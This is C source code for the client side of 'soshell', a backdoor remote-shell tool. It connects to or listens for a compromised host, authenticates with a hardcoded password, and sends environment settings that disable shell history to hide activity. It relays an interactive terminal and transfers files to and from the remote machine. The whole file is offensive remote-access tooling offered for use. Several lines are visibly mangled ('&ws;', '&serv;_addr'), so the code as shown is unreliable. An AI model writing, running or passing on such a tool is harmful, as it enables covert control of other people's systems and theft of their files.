/*

 soshell's client side V. 0.2

 based on contty , thx sd

 Code by W.Z.T    <wzt@xsec.org>

*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <termios.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/ioctl.h>

#define ECHAR            0x1d
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414

#define BUF                16384
#define BUF_SIZE        4096
#define    ENVLEN            256
#define MAXNAME            100
#define MAXFD             5
#define  CREATMODE        0777

#define PASSWD    "tthacker"

int    winsize;

int flag_u=0;
int flag_g=0;

char send_filename[MAXNAME];
char save_filename[MAXNAME];

char *envtab[] =
{
    "",
    "",
    "LOGNAME=shitdown",
    "USERNAME=shitdown",
    "USER=shitdown",
    "PS1=[\\ut@\\h \\W]\\$ ",
    "HISTFILE=/dev/null",
    "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin",
    "!TERM",
    NULL
};

void sendenv(int sock);
void winch(int i);
int    usage(char *pro);
void connect_server(char *hosts,char *port);
void listen_server(char *port);
void send_file(int sock_id);
void save_file(int client_fd);
void handler(int sock);

void sendenv(int sock)
{
    struct    winsize    ws;
    char    envbuf[ENVLEN+1];
    char    buf1[256];
    char    buf2[256];
    int    i = 0;

    ioctl(0, TIOCGWINSZ, &ws;);
    sprintf(buf1, "COLUMNS=%d", ws.ws_col);
    sprintf(buf2, "LINES=%d", ws.ws_row);
    envtab[0] = buf1; envtab[1] = buf2;

    while (envtab[i]) {
        bzero(envbuf, ENVLEN);
        if (envtab[i][0] == '!') {
            char *env;
            env = getenv(&envtab;[i][1]);
            if (!env) goto oops;
            sprintf(envbuf, "%s=%s", &envtab;[i][1], env);
        } else {
            strncpy(envbuf, envtab[i], ENVLEN);
        }
        write(sock, envbuf, ENVLEN);
    oops:
        i++;
    }
    write(sock, "\n\n\n", 3);
}

void winch(int i)
{
    signal(SIGWINCH, winch);
    winsize++;
}

void connect_server(char *hosts,char *port)
{
    struct sockaddr_in serv_addr;
    struct hostent     *host;
    int sock_fd,pid;

    if((host=gethostbyname(hosts))==NULL){
        herror("gethostbyname");
        exit(1);
    }

    if((sock_fd=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        exit(1);
    }

    serv_addr.sin_family=AF_INET;
    serv_addr.sin_port=htons(atoi(port));
    serv_addr.sin_addr=*((struct in_addr *)host->h_addr);
        
    bzero(&(serv_addr.sin_zero),8);

    if(connect(sock_fd,(struct sockaddr *)&serv;_addr,sizeof(struct sockaddr))==-1){
        perror("CONNECT");
        exit(1);
    }

    if(flag_u==1){
        send_file(sock_fd);
    }
    else{                    
        printf("Connected to %s.\nEscape character is '^]'\n", host->h_addr);
        handler(sock_fd);
    }
}

void listen_server(char *port)
{
    int val=1;
    int pid;
    int  sin_size;
    int sock_fd,client_fd;
    struct sockaddr_in my_addr;
     struct sockaddr_in remote_addr;

    if((sock_fd=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        exit(1);
    }
   
    my_addr.sin_family=AF_INET;
    my_addr.sin_port=htons(atoi(port));
    my_addr.sin_addr.s_addr=INADDR_ANY;

    bzero(&(my_addr.sin_zero),8);

    if(bind(sock_fd,(struct sockaddr *)&my;_addr,sizeof(struct sockaddr))==-1){
        perror("bind");
        exit(1);
    }

    printf("Listen on port %d\n\n",atoi(port));
    
    if(listen(sock_fd,MAXFD)==-1){
        perror("listen");
        close(sock_fd);
        exit(0);
    }
    
    
    sin_size=sizeof(struct sockaddr_in);
    if((client_fd=accept(sock_fd,(struct sockaddr *)&remote;_addr,&sin;_size))==-1){
        perror("accept");
        exit(1);
    }

    if(flag_g==1){
        save_file(client_fd);
        close(client_fd);
        exit(0);
    }
    else{
        handler(client_fd);
    }
    
}

void send_file(int sock_id)
{
    int fd,n_char;    
    char buffer[BUF_SIZE];
    
    if((fd=open(send_filename,O_RDONLY))<0){
        fprintf(stderr,"Cannot open %s\n",send_filename);
        exit(1);
    }

    printf("[+] Open %s ok.\n",send_filename);    
    while((n_char=read(fd,buffer,BUF_SIZE))>0){
        write(sock_id,buffer,n_char);
        printf("Send %d bytes ok.\n",n_char);
    }
        
    fprintf(stdout,"[+] Send file %s ok!!\n",send_filename);
    close(fd);
}
    
void save_file(int client_fd)
{
    int fd,n_char;
    char buffer[BUF_SIZE];
    
    if((fd=creat(save_filename,CREATMODE))<0){
        fprintf(stderr,"Cannot create % .n",save_filename);
        exit(1);
    }
    
    printf("[+] Create file %s ok.\n",save_filename);
    while((n_char=read(client_fd,buffer,BUF_SIZE))>0){
        printf("read %d bytes ok.\n",n_char);
        write(fd,buffer,n_char);
        printf("[+] Save %d bytes ok.\n",n_char);
    }
    
    printf("[+] Save file %s ok.\n",save_filename);

    close(fd);
}
    
void handler(int sock)
{
    struct    termios    old, new;
    unsigned char    buf[BUF];
    fd_set        fds;
    int        eerrno;
    struct    winsize    ws;    
    
    read(sock,buf,sizeof(buf));
    write(sock,PASSWD,sizeof(PASSWD));
    /* send enviroment */
    sendenv(sock);

    /* set-up terminal */
    tcgetattr(0, &old;);
    new = old;
    new.c_lflag &= ~(ICANON | ECHO | ISIG);
    new.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &new;);

    winch(0);
    while (1) {
        FD_ZERO(&fds;);
        FD_SET(0, &fds;);
        FD_SET(sock, &fds;);
        
        if (winsize) {
            if (ioctl(0, TIOCGWINSZ, &ws;) == 0) {
                buf[0] = ECHAR;
                buf[1] = (ws.ws_col >> 8) & 0xFF;
                buf[2] = ws.ws_col & 0xFF;
                buf[3] = (ws.ws_row >> 8) & 0xFF;
                buf[4] = ws.ws_row & 0xFF;
                write(sock, buf, 5);
            }
            winsize = 0;
        }

        if (select(sock+1, &fds;, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (winsize) continue;
        if (FD_ISSET(0, &fds;)) {
            int    count = read(0, buf, BUF);
            int    i;
            if (count <= 0) break;
            if (memchr(buf, ECHAR, count)) break;
            if (write(sock, buf, count) <= 0) break;
        }
        if (FD_ISSET(sock, &fds;)) {
            int    count = read(sock, buf, BUF);
            if (count <= 0) break;
            if (write(0, buf, count) <= 0) break;
        }
    }
    close(sock);
    tcsetattr(0, TCSAFLUSH, &old;);
    printf("\nConnection closed.\n");
}

int    usage(char *pro)
{
    fprintf(stdout,"Usage:\n");
    fprintf(stdout,"Connect server:    %s <remote ip> <port>\n",pro);
    fprintf(stdout,"Listen server:    %s <port>\n",pro);
    fprintf(stdout,"Send file:    %s -u <remote ip> <port> <filename>\n",pro);
    fprintf(stdout,"Save file:    %s -g <port> <filename>\n",pro);
    exit(0);
}

int main(int argc,char **argv)
{
    if(argc==1){
        usage(argv[0]);
    }
    if(argc==2){
        listen_server(argv[1]);
    }
    if(argc==3){
        connect_server(argv[1],argv[2]);
    }
    if(argc==4&&!strcmp(argv[1],"-g")){
        flag_g=1;
        strcpy(save_filename,argv[3]);
        listen_server(argv[2]);
    }
    if(argc==5&&!strcmp(argv[1],"-u")){
        flag_u=1;
        strcpy(send_filename,argv[4]);        
        connect_server(argv[2],argv[3]);        
    }
    
    return 0;
}
